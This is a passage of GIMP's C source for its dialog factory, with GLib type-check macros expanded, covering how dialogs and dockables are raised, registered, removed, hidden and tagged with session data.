* @screen:       the #GdkScreen the dialog should appear on\n * @identifiers:  a '|' separated list of identifiers of dialogs as\n *                registered with gimp_dialog_factory_register_entry()\n * @view_size:    the initial preview size if a dialog needs to be created\n *\n * Raises any of a list of already existing toplevel dialog or\n * #GimpDockable if it was already created by this %facory.\n *\n * Implicitly creates the first dialog in the list if none of the dialogs\n * were found.\n *\n * Return value: the raised or newly created dialog.\n **/\n\nGtkWidget *gimp_dialog_factory_dialog_raise(GimpDialogFactory *factory,GdkScreen *screen,const gchar *identifiers,gint view_size)\n{\n  GtkWidget *dialog;\n  gchar **ids;\n  gint i;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)screen;\n      GType __t = gdk_screen_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GDK_IS_SCREEN (screen)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifiers != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifiers != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n/*  If the identifier is a list, try to find a matching dialog and\n   *  raise it. If there's no match, use the first list item.\n   *\n   *  (we split the identifier list manually here because we must pass\n   *  a single identifier, not a list, to new_internal() below)\n   */\n  ids = g_strsplit(identifiers,\"|\",0);\n  for (i = 0; ids[i]; i++) {\n    if (gimp_dialog_factory_find_widget(factory,ids[i])) {\n      break; \n    }\n  }\n  dialog = gimp_dialog_factory_dialog_new_internal(factory,screen,((void *)0),((void *)0),((ids[i]?ids[i] : ids[0])),view_size,!0,!0,!0);\n/*return_existing*/\n/*present*/\n/*create_containers*/\n  g_strfreev(ids);\n  return dialog;\n}\n/**\n * gimp_dialog_factory_dockable_new:\n * @factory:      a #GimpDialogFactory\n * @dock:         a #GimpDock crated by this %factory.\n * @identifier:   the identifier of the dialog as registered with\n *                gimp_dialog_factory_register_entry()\n * @view_size:\n *\n * Creates a new #GimpDockable in the context of the #GimpDock it will be\n * added to.\n *\n * Implicitly raises & returns an already existing singleton dockable,\n * so callers should check that gimp_dockable_get_dockbook (dockable)\n * is NULL before trying to add it to it's #GimpDockbook.\n *\n * Return value: the newly created #GimpDockable or an already existing\n *               singleton dockable.\n **/\n\nGtkWidget *gimp_dialog_factory_dockable_new(GimpDialogFactory *factory,GimpDock *dock,const gchar *identifier,gint view_size)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dock;\n      GType __t = gimp_dock_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DOCK (dock)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  return gimp_dialog_factory_dialog_new_internal(factory,gtk_widget_get_screen(((GtkWidget *)(g_type_check_instance_cast(((GTypeInstance *)dock),gtk_widget_get_type())))),gimp_dock_get_context(dock),gimp_dock_get_ui_manager(dock),identifier,view_size,0,0,0);\n/*return_existing*/\n/*present*/\n/*create_containers*/\n}\n\nvoid gimp_dialog_factory_add_dialog(GimpDialogFactory *factory,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory = ((void *)0);\n  GimpDialogFactoryEntry *entry = ((void *)0);\n  GimpSessionInfo *info = ((void *)0);\n  GList *list = ((void *)0);\n  gboolean toplevel = 0;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog already registered\",((const char *)__func__));\n    return ;\n  }\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return ;\n  }\n  toplevel = gtk_widget_is_toplevel(dialog);\n  if (entry) {\n/* dialog is a toplevel (but not a GimpDockWindow) or a GimpDockable */\n    do {\n      if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n        gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),888,\"adding %s \\\"%s\\\"\",(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n      }\n    }while (0);\n    for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n      GimpSessionInfo *current_info = (list -> data);\n      if (gimp_session_info_get_factory_entry(current_info) == entry) {\n        if (gimp_session_info_get_widget(current_info)) {\n          if (gimp_session_info_is_singleton(current_info)) {\n            g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: singleton dialog \\\"%s\\\" created twice\",((const char *)__func__),entry -> identifier);\n            do {\n              if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n                gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),906,\"corrupt session info: %p (widget %p)\",current_info,gimp_session_info_get_widget(current_info));\n              }\n            }while (0);\n            return ;\n          }\n          continue; \n        }\n        gimp_session_info_set_widget(current_info,dialog);\n        do {\n          if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n            gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),921,\"updating session info %p (widget %p) for %s \\\"%s\\\"\",current_info,gimp_session_info_get_widget(current_info),(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n          }\n        }while (0);\n        if (toplevel && gimp_session_info_is_session_managed(current_info) && !gtk_widget_get_visible(dialog)) {\n          gimp_session_info_apply_geometry(current_info);\n        }\n        info = current_info;\n        break; \n      }\n    }\n    if (!info) {\n      info = gimp_session_info_new();\n      gimp_session_info_set_widget(info,dialog);\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),946,\"creating session info %p (widget %p) for %s \\\"%s\\\"\",info,gimp_session_info_get_widget(info),(toplevel?\"toplevel\" : \"dockable\"),entry -> identifier);\n        }\n      }while (0);\n      gimp_session_info_set_factory_entry(info,entry);\n      if (gimp_session_info_is_session_managed(info)) {\n/* Make the dialog show up at the user position the\n               * first time it is shown. After it has been shown the\n               * first time we don't want it to show at the mouse the\n               * next time. Think of the use cases \"hide and show with\n               * tab\" and \"change virtual desktops\"\n               */\n        do {\n          if (gimp_log_flags & GIMP_LOG_WM) {\n            gimp_log(GIMP_LOG_WM,((const char *)__func__),959,\"setting GTK_WIN_POS_MOUSE for %p (\\\"%s\\\")\\n\",dialog,entry -> identifier);\n          }\n        }while (0);\n        gtk_window_set_position(((GtkWindow *)(g_type_check_instance_cast(((GTypeInstance *)dialog),gtk_window_get_type()))),GTK_WIN_POS_MOUSE);\n        g_signal_connect_data(dialog,\"configure-event\",((GCallback )gimp_dialog_factory_set_user_pos),((void *)0),((void *)0),(0));\n      }\n      gimp_dialog_factory_add_session_info(factory,info);\n      g_object_unref(info);\n    }\n  }\n/* Some special logic for dock windows */\n  if (({\n    GTypeInstance *__inst = (GTypeInstance *)dialog;\n    GType __t = gimp_dock_window_get_type();\n    gboolean __r;\n    if (!__inst) {\n      __r = 0;\n    }\n    else {\n      if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n        __r = !0;\n      }\n      else {\n        __r = g_type_check_instance_is_a(__inst,__t);\n      }\n    }\n    __r;\n  })) \n{\n    g_signal_emit(factory,factory_signals[DOCK_WINDOW_ADDED],0,dialog);\n  }\n  factory -> p -> open_dialogs = g_list_prepend(factory -> p -> open_dialogs,dialog);\n  g_signal_connect_object(dialog,\"destroy\",((GCallback )gimp_dialog_factory_remove_dialog),factory,G_CONNECT_SWAPPED);\n  if (gimp_session_info_is_session_managed(info)) {\n    g_signal_connect_object(dialog,\"configure-event\",((GCallback )gimp_dialog_factory_dialog_configure),factory,(0));\n  }\n}\n\nvoid gimp_dialog_factory_add_foreign(GimpDialogFactory *factory,const gchar *identifier,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (identifier != ((void *)0)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"identifier != NULL\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (gtk_widget_is_toplevel(dialog)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gtk_widget_is_toplevel (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (dialog_factory || entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was created by a GimpDialogFactory\",((const char *)__func__));\n    return ;\n  }\n  entry = gimp_dialog_factory_find_entry(factory,identifier);\n  if (!entry) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: no entry registered for \\\"%s\\\"\",((const char *)__func__),identifier);\n    return ;\n  }\n  if (entry -> new_func) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: entry for \\\"%s\\\" has a constructor (is not foreign)\",((const char *)__func__),identifier);\n    return ;\n  }\n  gimp_dialog_factory_set_widget_data(dialog,factory,entry);\n  gimp_dialog_factory_add_dialog(factory,dialog);\n}\n\nvoid gimp_dialog_factory_remove_dialog(GimpDialogFactory *factory,GtkWidget *dialog)\n{\n  GimpDialogFactory *dialog_factory;\n  GimpDialogFactoryEntry *entry;\n  GList *list;\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!g_list_find(factory -> p -> open_dialogs,dialog)) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog not registered\",((const char *)__func__));\n    return ;\n  }\n  factory -> p -> open_dialogs = g_list_remove(factory -> p -> open_dialogs,dialog);\n  dialog_factory = gimp_dialog_factory_from_widget(dialog,&entry);\n  if (!gimp_dialog_factory_dialog_sane(factory,dialog_factory,entry,dialog)) {\n    return ;\n  }\n  do {\n    if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n      gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1064,\"removing \\\"%s\\\" (dialog = %p)\",entry -> identifier,dialog);\n    }\n  }while (0);\n  for (list = factory -> p -> session_infos; list; list = (list?((GList *)list) -> next : ((void *)0))) {\n    GimpSessionInfo *session_info = (list -> data);\n    if (gimp_session_info_get_widget(session_info) == dialog) {\n      do {\n        if (gimp_log_flags & GIMP_LOG_DIALOG_FACTORY) {\n          gimp_log(GIMP_LOG_DIALOG_FACTORY,((const char *)__func__),1075,\"clearing session info %p (widget %p) for \\\"%s\\\"\",session_info,gimp_session_info_get_widget(session_info),entry -> identifier);\n        }\n      }while (0);\n      gimp_session_info_set_widget(session_info,((void *)0));\n      gimp_dialog_factory_unset_widget_data(dialog);\n      g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_set_user_pos,((void *)0));\n      g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_remove_dialog,factory);\n      if (gimp_session_info_is_session_managed(session_info)) {\n        g_signal_handlers_disconnect_matched(dialog,(24),0,0,((void *)0),gimp_dialog_factory_dialog_configure,factory);\n      }\n      if (({\n        GTypeInstance *__inst = (GTypeInstance *)dialog;\n        GType __t = gimp_dock_window_get_type();\n        gboolean __r;\n        if (!__inst) {\n          __r = 0;\n        }\n        else {\n          if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n            __r = !0;\n          }\n          else {\n            __r = g_type_check_instance_is_a(__inst,__t);\n          }\n        }\n        __r;\n      })) \n{\n/*  don't save session info for empty docks  */\n        factory -> p -> session_infos = g_list_remove(factory -> p -> session_infos,session_info);\n        g_object_unref(session_info);\n        g_signal_emit(factory,factory_signals[DOCK_WINDOW_REMOVED],0,dialog);\n      }\n      break; \n    }\n  }\n}\n\nvoid gimp_dialog_factory_hide_dialog(GtkWidget *dialog)\n{\n  GimpDialogFactory *factory = ((void *)0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (gtk_widget_is_toplevel(dialog)) {\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"gtk_widget_is_toplevel (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!(factory = gimp_dialog_factory_from_widget(dialog,((void *)0)))) {\n    g_log(\"Gimp-Widgets\",G_LOG_LEVEL_WARNING,\"%s: dialog was not created by a GimpDialogFactory\",((const char *)__func__));\n    return ;\n  }\n  gtk_widget_hide(dialog);\n  if ((factory -> p -> dialog_state) != GIMP_DIALOGS_SHOWN) {\n    g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),\"gimp-dialog-visibility\",((gpointer )((glong )GIMP_DIALOG_VISIBILITY_INVISIBLE)));\n  }\n}\n\nvoid gimp_dialog_factory_set_state(GimpDialogFactory *factory,GimpDialogsState state)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  factory -> p -> dialog_state = state;\n  if (state == GIMP_DIALOGS_SHOWN) {\n    gimp_dialog_factory_show(factory);\n  }\n  else {\n    gimp_dialog_factory_hide(factory);\n  }\n}\n\nGimpDialogsState gimp_dialog_factory_get_state(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return GIMP_DIALOGS_SHOWN;\n    }\n    ;\n  }while (0);\n  return factory -> p -> dialog_state;\n}\n\nvoid gimp_dialog_factory_show_with_display(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if ((factory -> p -> dialog_state) == GIMP_DIALOGS_HIDDEN_WITH_DISPLAY) {\n    gimp_dialog_factory_set_state(factory,GIMP_DIALOGS_SHOWN);\n  }\n}\n\nvoid gimp_dialog_factory_hide_with_display(GimpDialogFactory *factory)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if ((factory -> p -> dialog_state) == GIMP_DIALOGS_SHOWN) {\n    gimp_dialog_factory_set_state(factory,GIMP_DIALOGS_HIDDEN_WITH_DISPLAY);\n  }\n}\nstatic GQuark gimp_dialog_factory_key = 0;\nstatic GQuark gimp_dialog_factory_entry_key = 0;\n\nGimpDialogFactory *gimp_dialog_factory_from_widget(GtkWidget *dialog,GimpDialogFactoryEntry **entry)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ((void *)0);\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    gimp_dialog_factory_key = g_quark_from_static_string(\"gimp-dialog-factory\");\n    gimp_dialog_factory_entry_key = g_quark_from_static_string(\"gimp-dialog-factory-entry\");\n  }\n  if (entry) {\n     *entry = (g_object_get_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key));\n  }\n  return (g_object_get_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key));\n}\n#define GIMP_DIALOG_FACTORY_MIN_SIZE_KEY \"gimp-dialog-factory-min-size\"\n\nvoid gimp_dialog_factory_set_has_min_size(GtkWindow *window,gboolean has_min_size)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)window;\n      GType __t = gtk_window_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WINDOW (window)\");\n      return ;\n    }\n    ;\n  }while (0);\n  g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)window),((GType )(20 << 2))))),\"gimp-dialog-factory-min-size\",((gpointer )((glong )(has_min_size?!0 : 0))));\n}\n\ngboolean gimp_dialog_factory_get_has_min_size(GtkWindow *window)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)window;\n      GType __t = gtk_window_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WINDOW (window)\");\n      return 0;\n    }\n    ;\n  }while (0);\n  return (gint )((glong )(g_object_get_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)window),((GType )(20 << 2))))),\"gimp-dialog-factory-min-size\")));\n}\n/*  private functions  */\n\nstatic GtkWidget *gimp_dialog_factory_constructor(GimpDialogFactory *factory,GimpDialogFactoryEntry *entry,GimpContext *context,GimpUIManager *ui_manager,gint view_size)\n{\n  GtkWidget *widget;\n  widget = ((entry -> new_func)(factory,context,ui_manager,view_size));\n/* The entry is for a dockable, so we simply need to put the created\n   * widget in a dockable\n   */\n  if (widget && entry -> dockable) {\n    GtkWidget *dockable = ((void *)0);\n    dockable = gimp_dockable_new((entry -> name),(entry -> blurb),(entry -> stock_id),(entry -> help_id));\n    gtk_container_add(((GtkContainer *)(g_type_check_instance_cast(((GTypeInstance *)dockable),gtk_container_get_type()))),widget);\n    gtk_widget_show(widget);\n/* EEK */\n    g_object_set_data(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dockable),((GType )(20 << 2))))),\"gimp-dialog-identifier\",(entry -> identifier));\n/* Return the dockable instead */\n    widget = dockable;\n  }\n  return widget;\n}\n\nstatic void gimp_dialog_factory_config_notify(GimpDialogFactory *factory,GParamSpec *pspec,GimpGuiConfig *config)\n{\n  GimpDialogsState state = gimp_dialog_factory_get_state(factory);\n  GimpDialogsState new_state = state;\n/* Make sure the state and config are in sync */\n  if (config -> hide_docks && state == GIMP_DIALOGS_SHOWN) {\n    new_state = GIMP_DIALOGS_HIDDEN_EXPLICITLY;\n  }\n  else {\n    if (!config -> hide_docks) {\n      new_state = GIMP_DIALOGS_SHOWN;\n    }\n  }\n  if (state != new_state) {\n    gimp_dialog_factory_set_state(factory,new_state);\n  }\n}\n\nstatic void gimp_dialog_factory_set_widget_data(GtkWidget *dialog,GimpDialogFactory *factory,GimpDialogFactoryEntry *entry)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)factory;\n      GType __t = gimp_dialog_factory_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GIMP_IS_DIALOG_FACTORY (factory)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    gimp_dialog_factory_key = g_quark_from_static_string(\"gimp-dialog-factory\");\n    gimp_dialog_factory_entry_key = g_quark_from_static_string(\"gimp-dialog-factory-entry\");\n  }\n  g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key,factory);\n  if (entry) {\n    g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_entry_key,entry);\n  }\n}\n\nstatic void gimp_dialog_factory_unset_widget_data(GtkWidget *dialog)\n{\n  do {\n    if (({\n      GTypeInstance *__inst = (GTypeInstance *)dialog;\n      GType __t = gtk_widget_get_type();\n      gboolean __r;\n      if (!__inst) {\n        __r = 0;\n      }\n      else {\n        if (__inst -> g_class && __inst -> g_class -> g_type == __t) {\n          __r = !0;\n        }\n        else {\n          __r = g_type_check_instance_is_a(__inst,__t);\n        }\n      }\n      __r;\n    })) \n{\n    }\n    else {\n      g_return_if_fail_warning(\"Gimp-Widgets\",__PRETTY_FUNCTION__,\"GTK_IS_WIDGET (dialog)\");\n      return ;\n    }\n    ;\n  }while (0);\n  if (!gimp_dialog_factory_key) {\n    return ;\n  }\n  g_object_set_qdata(((GObject *)(g_type_check_instance_cast(((GTypeInstance *)dialog),((GType )(20 << 2))))),gimp_dialog_factory_key,((void *)0));\n  